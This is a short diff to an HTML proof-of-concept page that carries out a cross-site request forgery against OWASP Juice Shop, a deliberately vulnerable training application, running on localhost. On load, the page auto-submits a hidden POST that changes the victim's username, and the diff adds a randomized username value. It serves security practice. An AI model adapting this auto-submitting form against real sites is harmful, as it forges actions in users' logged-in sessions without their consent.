@@ -1,5 +1,9 @@
+<!-- this form is designed to exploit CSRF in the OWASP juice shop, sorry if somebody embeds it elsewhere and it posts to your localhost, it would be trivial for anyone to write or host this themselves -->
 <form action="http://localhost:3000/profile" method="POST">
   <input name="username" value="CSRF"/>
+  <!-- do we need the submit? -->
   <input type="submit"/>
 </form>
-<script>document.forms[0].submit();</script>
+<script>
+  document.querySelector('[name="username"]').value=['CSRF-1', 'CSRF-2', 'CSRF-3', 'CSRF-4'][Math.floor((Math.random()*4))];
+  document.forms[0].submit();</script>
